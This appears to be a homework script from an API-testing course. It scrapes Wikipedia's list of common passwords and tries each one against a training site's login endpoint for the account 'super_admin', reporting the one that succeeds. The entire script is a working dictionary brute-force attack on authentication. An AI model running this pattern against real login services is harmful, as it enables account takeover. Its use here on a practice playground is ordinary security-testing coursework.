import requests
from lxml import html

login = 'super_admin'

response = requests.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")
tree = html.fromstring(response.text)
locator = '//*[contains(text(),"Top 25 most common passwords by year according to SplashData")]//..//td[@align="left"]/text()'
passwords = tree.xpath(locator)

cookie_url = 'https://playground.learnqa.ru/ajax/api/get_secret_password_homework'
check_url = 'https://playground.learnqa.ru/ajax/api/check_auth_cookie'
answer = 'You are authorized'
true_pass = ''

for password in passwords:
    payload = {'login': login, 'password': password}
    response1 = requests.post(url=cookie_url, data=payload)
    print(dict(response1.cookies))

    cookie_value = response1.cookies.get('auth_cookie')
    cookies = {'auth_value': cookie_value}
    response2 = requests.post(url=check_url, cookies=cookies)
    print(response2.text)
    if response2.text == answer:
        true_pass = password

print("\n----------------------------")
print(answer)
print(f"Your pass: {true_pass}")
